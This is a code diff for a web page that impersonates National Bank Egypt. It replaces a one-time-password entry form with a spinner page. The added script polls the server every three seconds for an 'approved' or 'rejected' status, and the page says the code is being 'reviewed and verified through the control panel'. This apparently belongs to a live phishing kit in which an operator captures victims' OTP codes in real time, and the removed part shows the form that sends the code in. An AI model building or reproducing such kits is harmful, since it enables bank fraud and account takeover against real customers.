@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>National Bank Egypt - OTP Verification</title>
+    <title>National Bank Egypt - Verifying OTP</title>
     <style>
         * {
             margin: 0;
@@ -22,6 +22,7 @@
             flex-direction: column;
             min-height: 100vh;
         }
+        /* Header: Logo on the left, Language button, and three bars on the right */
         header {
             background-color: #ffffff;
             display: flex;
@@ -68,81 +69,54 @@
             color: white;
         }
 
-        .form-container-wrapper {
+        /* Loading Container Section */
+        .loading-container-wrapper {
             max-width: 500px;
-            margin: 40px auto;
+            margin: 60px auto;
             padding: 0 15px;
             width: 100%;
             flex: 1;
+            display: flex;
+            align-items: center;
         }
-        .form-box {
+        .loading-box {
             background: #ffffff;
             border-radius: 12px;
-            padding: 30px 25px;
+            padding: 40px 25px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.06);
             border: 1px solid #eee;
             text-align: center;
+            width: 100%;
         }
-        .form-title {
-            font-size: 22px;
+        
+        /* Spinner Styles */
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #ff7f00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-title {
+            font-size: 20px;
             color: #1a1a1a;
             font-weight: 800;
             margin-bottom: 12px;
         }
-        .form-subtitle {
+        .loading-text {
             font-size: 14px;
             color: #666;
-            margin-bottom: 25px;
             line-height: 1.6;
         }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        .form-control {
-            width: 100%;
-            padding: 14px 18px;
-            border: 1px solid #ddd;
-            border-radius: 25px;
-            font-size: 18px;
-            text-align: center;
-            letter-spacing: 4px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        .form-control:focus {
-            border-color: #ff7f00;
-        }
-        .resend-container {
-            margin-top: 15px;
-            margin-bottom: 10px;
-        }
-        .resend-link {
-            font-size: 14px;
-            color: #ff7f00;
-            text-decoration: none;
-            font-weight: 800;
-            display: inline-block;
-        }
-        .resend-link:hover {
-            text-decoration: underline;
-        }
-        .submit-btn {
-            background-color: #ff7f00;
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 14px;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            margin-top: 10px;
-        }
-        .submit-btn:hover {
-            background-color: #e06f00;
-        }
 
+        /* Footer */
         footer {
             background-color: #ff7f00;
             color: white;
@@ -186,14 +160,50 @@
             font-size: 13px;
         }
     </style>
-    <link rel="stylesheet" href="shared-theme.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='shared-theme.css') }}">
 </head>
 <body>
+
+    <!-- Traffic and Database Tracking Script -->
+    <script>
+        const requestId = localStorage.getItem("request_id");
+
+        fetch('/track_visit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ action: 'track_visit', page: 'otp_loading_en' })
+        }).catch(error => console.error('Error tracking visit:', error));
+
+        function checkStatus() {
+            if (!requestId) return;
+            
+            fetch('/request_status/' + requestId)
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'approved') {
+                    window.location.href = 'success_en.html';
+                } else if (data.status === 'rejected') {
+                    window.location.href = 'otp_en.html?rejected=true';
+                } else if (data.redirect_to) {
+                    window.location.href = data.redirect_to;
+                }
+            })
+            .catch(error => console.error('Error checking status:', error));
+        }
+
+        if (requestId) {
+            setInterval(checkStatus, 3000);
+        } else {
+            setTimeout(() => { window.location.href = 'otp_en.html'; }, 5000);
+        }
+    </script>
 
     <!-- Header: Logo left, Language button, and Menu icon right -->
 <header class="site-header">
     <a class="site-brand" href="index_en.html" aria-label="National Bank Egypt">
-        <img src="static_nbe_logo_full.png" alt="National Bank Egypt">
+        <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="National Bank Egypt">
     </a>
     <div class="site-header-actions header-left">
         <a href="index.html" class="language-icon" aria-label="العربية" title="العربية">
@@ -204,24 +214,12 @@
     </div>
 </header>
 
-    <!-- OTP Form Section -->
-    <div class="form-container-wrapper">
-        <div class="form-box">
-            <h2 class="form-title">OTP Verification</h2>
-            <p class="form-subtitle">A verification code has been sent to your registered phone number. Please enter the code to continue.</p>
-            
-            <form id="otpForm">
-                <div class="form-group">
-                    <input type="tel" id="otp_code" name="otp_code" class="form-control" placeholder="------" maxlength="6" inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required autofocus>
-                </div>
-
-                <div class="resend-container">
-                    <a href="#" class="resend-link">Resend Code?</a>
-                </div>
-
-                <div id="errorMessage" style="color: red; text-align: center; margin-bottom: 15px; display: none;"></div>
-                <button type="submit" class="submit-btn">Verify Code</button>
-            </form>
+    <!-- Loading Box Section -->
+    <div class="loading-container-wrapper">
+        <div class="loading-box">
+            <div class="spinner"></div>
+            <h2 class="loading-title">Verifying Security Code</h2>
+            <p class="loading-text">Please wait and do not close the page. Your OTP code is being reviewed and verified through the control panel...</p>
         </div>
     </div>
 
@@ -246,64 +244,6 @@
     </div>
     <div class="footer-bottom"><p>All rights reserved © National Bank Egypt 2026</p></div>
 </footer>
-
-    <!-- Scripts at the end of body -->
-    <script>
-        fetch('/track_visit', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ action: 'track_visit', page: 'otp_en' })
-        }).catch(error => console.error('Error tracking visit:', error));
-    </script>
-
-    <script>
-        document.getElementById("otpForm").addEventListener("submit", async function(event) {
-            event.preventDefault();
-
-            const otpCode = document.getElementById("otp_code").value;
-            const errorMessageDiv = document.getElementById("errorMessage");
-
-            try {
-                const response = await fetch("/submit_request", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        type: "otp",
-                        data: { otp_code: otpCode }
-                    })
-                });
-
-                const result = await response.json();
-
-                if (result.status === "pending") {
-                    localStorage.setItem("request_id", result.request_id);
-                    document.cookie = "request_id=" + result.request_id + "; path=/; max-age=3600";
-                    window.location.href = "otp_loading_en.html";
-                } else {
-                    errorMessageDiv.textContent = result.message || "An unexpected error occurred.";
-                    errorMessageDiv.style.display = "block";
-                }
-            } catch (error) {
-                console.error("Error during OTP submission:", error);
-                errorMessageDiv.textContent = "Error connecting to the server.";
-                errorMessageDiv.style.display = "block";
-            }
-        });
-    </script>
-
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const rejected = urlParams.get("rejected");
-        if (rejected === "true") {
-            const errorMessageDiv = document.getElementById("errorMessage");
-            errorMessageDiv.textContent = "The entered code is incorrect. Please check the code sent via mobile and try again.";
-            errorMessageDiv.style.display = "block";
-        }
-    </script>
 
 </body>
 </html>
